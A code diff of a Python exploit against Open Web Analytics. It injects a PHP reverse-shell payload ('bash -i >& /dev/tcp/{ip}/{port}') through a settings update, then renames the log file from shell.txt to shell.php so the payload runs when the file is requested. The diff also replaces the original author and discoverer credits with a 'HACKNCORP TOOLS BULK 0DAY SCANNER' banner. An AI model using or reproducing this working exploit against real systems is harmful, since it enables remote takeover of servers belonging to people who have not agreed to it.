@@ -62,13 +62,13 @@ def changeSetting(s, host, ip, port):
 	nonce = re.findall(r'"(.*?)"', re.compile("owa_nonce\"(.*)").search(r.text).group(1))[0]
 	print(f"[*] Found log path at: {log_path}")
 	print(f"[*] Grabbed nonce: {nonce}")
-	path = log_path + "shell.txt"
+	path = log_path + "shell.php"
 	payload = f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");?>"
 	data = {'owa_config[base.error_log_file]': f'{path}', 'owa_config[base.error_log_level]': '2', 'owa_config[base.excluded_ips]': f'{payload}', 'owa_nonce': f'{nonce}', 'owa_action': 'base.optionsUpdate', 'owa_module': 'base'}
 	r = s.post(host + settings, data=data)
 	if r.status_code == 200:
 		print("[*] Succesfully changed settings")
-		print(f"[*] Reverse shell at {host}owa-data/logs/shell.txt")
+		print(f"[*] Reverse shell at {host}owa-data/logs/shell.php")
 	else:
 		print("[X] Something went wrong, Try again!")
 		exit()
@@ -87,18 +87,16 @@ def getRevshell(s, host, newPass, ip, port):
 	log_path, nonce = changeSetting(s, host, ip, port)
 	sleep(1)
 	print("[*] Triggering reverse shell...")
-	s.get(host + 'owa-data/logs/shell.txt')
+	s.get(host + 'owa-data/logs/shell.php')
 	print("[X] Something went wrong! Try again!")
 
 def main():
 	print('''
-################################################
-#         Script made by 0xM4hm0ud             #
-#           Discovered by scryh                #
-#                                              #
-#       https://github.com/0xM4hm0ud           #
-#       https://devel0pment.de/?p=2494         #
-################################################
+\033[0;36m       ________ 
+\033[0;36m      /    /   \ 
+\033[0;36m     /         / \033[0;33mHACKNCORP TOOLS
+\033[0;37m    /         / \033[0;33mBULK 0DAY SCANNER
+\033[0;37m    \___/____/ \033[0;33mhackncorp@gmail.com
 		''')
 	print("[*] Start exploit!")
 	if len(sys.argv) < 5:
